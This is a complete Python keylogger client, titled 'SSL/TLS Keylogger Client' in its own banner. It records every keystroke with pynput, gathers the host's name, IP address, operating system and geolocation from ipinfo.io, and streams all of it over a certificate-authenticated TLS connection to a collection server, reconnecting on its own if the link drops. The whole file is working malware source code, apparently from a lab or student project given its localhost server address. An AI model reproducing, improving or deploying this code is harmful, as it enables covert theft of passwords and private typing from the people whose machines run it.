from pynput.keyboard import Key, Listener
import socket
import ssl
import threading
import platform
import time
import requests

# SSL Configuration
SSL_SERVER_HOST = "127.0.0.1"
SSL_SERVER_PORT = 10000
CLIENT_CERT = "certs/client1_cert.pem"
CLIENT_KEY = "certs/client1_key.pem"
CA_CERT = "certs/ca_cert.pem"

# Global secure socket connection
secure_socket = None
socket_lock = threading.Lock()


def create_ssl_context():
    """Create SSL context for client with certificate authentication"""
    try:
        # Create SSL context
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

        # Load client certificate and private key
        context.load_cert_chain(
            certfile=CLIENT_CERT,
            keyfile=CLIENT_KEY
        )

        # Load CA certificate to verify server
        context.load_verify_locations(cafile=CA_CERT)

        # Require server certificate verification
        context.check_hostname = False  # Set to True if using proper hostname
        context.verify_mode = ssl.CERT_REQUIRED

        # Set strong cipher suites
        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')

        # Allow TLS 1.2 and 1.3
        context.minimum_version = ssl.TLSVersion.TLSv1_2

        print("[+] SSL context created successfully")
        return context

    except FileNotFoundError as e:
        print(f"[!] Certificate file not found: {e}")
        print("[!] Please ensure certificates are in 'certs/' directory")
        return None
    except Exception as e:
        print(f"[!] Error creating SSL context: {e}")
        return None


def connect_to_server():
    """Establish persistent SSL connection to server"""
    global secure_socket

    try:
        # Create SSL context
        ssl_context = create_ssl_context()
        if not ssl_context:
            print("[!] Failed to create SSL context")
            return False

        # Create raw socket
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_socket.settimeout(10)  # 10 second timeout

        # Wrap with SSL
        secure_socket = ssl_context.wrap_socket(raw_socket, server_hostname=SSL_SERVER_HOST)

        # Connect to server
        secure_socket.connect((SSL_SERVER_HOST, SSL_SERVER_PORT))

        # Get connection info
        cipher = secure_socket.cipher()
        version = secure_socket.version()

        print(f"[+] Connected to server via SSL/TLS")
        print(f"    - Cipher: {cipher}")
        print(f"    - TLS Version: {version}")

        return True

    except ssl.SSLError as e:
        print(f"[!] SSL Error: {e}")
        print("[!] Certificate may be revoked or invalid")
        secure_socket = None
        return False
    except ConnectionRefusedError:
        print(f"[!] Connection refused. Is the server running on {SSL_SERVER_HOST}:{SSL_SERVER_PORT}?")
        secure_socket = None
        return False
    except socket.timeout:
        print(f"[!] Connection timeout. Server not responding.")
        secure_socket = None
        return False
    except Exception as e:
        print(f"[!] Error connecting to server: {e}")
        secure_socket = None
        return False


def send_data_to_gui(data):
    """Send data over persistent SSL connection"""
    global secure_socket

    with socket_lock:
        try:
            if secure_socket is None:
                print("[!] Not connected to server, attempting to reconnect...")
                if not connect_to_server():
                    print("[!] Failed to reconnect, data not sent")
                    return False

            # Send data
            secure_socket.sendall(data.encode())
            print(f"[+] Sent (encrypted): {data[:50]}...")  # Show first 50 chars
            return True

        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            print(f"[!] Connection lost: {e}")
            print("[!] Attempting to reconnect...")
            secure_socket = None
            if connect_to_server():
                # Retry sending
                try:
                    secure_socket.sendall(data.encode())
                    print(f"[+] Sent (encrypted): {data[:50]}...")
                    return True
                except Exception as e2:
                    print(f"[!] Failed to send after reconnect: {e2}")
                    return False
            return False

        except Exception as e:
            print(f"[!] Error sending data: {e}")
            return False


# Format key into readable string
def format_key(key):
    if key == Key.space:
        return " "
    elif key == Key.enter:
        return "\n"
    elif key == Key.backspace:
        return "[BACKSPACE]"
    elif isinstance(key, Key):
        return f"[{key.name.upper()}]"
    else:
        return str(key).replace("'", "")


# Function to send accumulated keystrokes to the GUI with timestamp
def send_current_char(char):
    if char.strip():  # Only send if it's not empty
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        send_data_to_gui(f"KEYLOG: [{timestamp}] {char.strip()}")


# Function to send computer info and geo-location to GUI
def send_initial_data():
    print("\n[*] Gathering initial data...")
    computer_info = get_computer_info()
    geo_location = get_geo_location()

    # Send computer information
    print("[*] Sending computer information...")
    if not send_data_to_gui(f"COMPUTER_INFO: {computer_info}"):
        print("[!] Failed to send computer information")
        return False

    # Small delay to ensure first message is processed
    time.sleep(0.5)

    # Send geo-location information
    print("[*] Sending geo-location information...")
    if not send_data_to_gui(f"GEO_LOCATION: {geo_location}"):
        print("[!] Failed to send geo-location")
        return False

    return True


# Function to retrieve computer information
def get_computer_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        system = platform.system()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        processor = platform.processor()

        computer_info = (
            f"Hostname: {hostname}\n"
            f"IP Address: {ip_address}\n"
            f"Operating System: {system} {release}\n"
            f"OS Version: {version}\n"
            f"Machine: {machine}\n"
            f"Processor: {processor}\n"
        )
        return computer_info
    except Exception as e:
        return f"Error gathering computer info: {e}"


# Function to retrieve geo-location information
def get_geo_location():
    try:
        response = requests.get("https://ipinfo.io/json", timeout=5)
        if response.status_code == 200:
            data = response.json()
            location = (
                f"IP Address: {data.get('ip', 'N/A')}\n"
                f"City: {data.get('city', 'N/A')}\n"
                f"Region: {data.get('region', 'N/A')}\n"
                f"Country: {data.get('country', 'N/A')}\n"
                f"Location (Lat, Long): {data.get('loc', 'N/A')}\n"
                f"Organization: {data.get('org', 'N/A')}\n"
            )
            return location
        else:
            return "Failed to get geo-location data."
    except Exception as e:
        return f"Error retrieving geo-location: {e}"


# Accumulate keystrokes as individual characters
current_char = ""


# Key press (optional if you prefer release only)
def on_press(key):
    pass  # You can log key press if needed


# Handle key release and update the current character
def on_release(key):
    global current_char

    formatted = format_key(key)

    if formatted == "\n":
        # When Enter key is pressed, send the character and start a new line
        send_current_char(current_char)
        current_char = ""  # Clear the current character after sending
    elif formatted == "[BACKSPACE]":
        # When backspace is pressed, remove the last character from the current character
        if current_char:
            current_char = current_char[:-1]  # Remove the last character
    else:
        # Otherwise, add the character to the current character string
        current_char += formatted

    # Debugging: print current character (optional, comment out for less verbose output)
    # print(f"Current Character: {current_char}")

    if key == Key.esc:
        return False  # Stop listener on ESC


# Start listener and send initial data
def start_keylogger():
    print("=" * 60)
    print("SSL/TLS Keylogger Client")
    print("=" * 60)
    print(f"Server: {SSL_SERVER_HOST}:{SSL_SERVER_PORT}")
    print(f"Client Certificate: {CLIENT_CERT}")
    print("=" * 60)

    # Connect to server
    print("\n[*] Connecting to server...")
    if not connect_to_server():
        print("[!] Cannot start - Failed to connect to server")
        return

    # Send initial computer and geo-location info
    if not send_initial_data():
        print("[!] Failed to send initial data")
        return

    print("\n[*] Starting keylogger...")
    print("[*] Press ESC to stop")
    print("=" * 60 + "\n")

    # Start the listener in a separate thread so the GUI can update without blocking
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True  # Ensure the listener thread ends when the main program exits
    listener_thread.start()

    # Keep the main program running while the listener runs in the background
    try:
        listener_thread.join()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        # Close connection
        if secure_socket:
            secure_socket.close()
            print("[*] Connection closed")


# Start listener
def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    start_keylogger()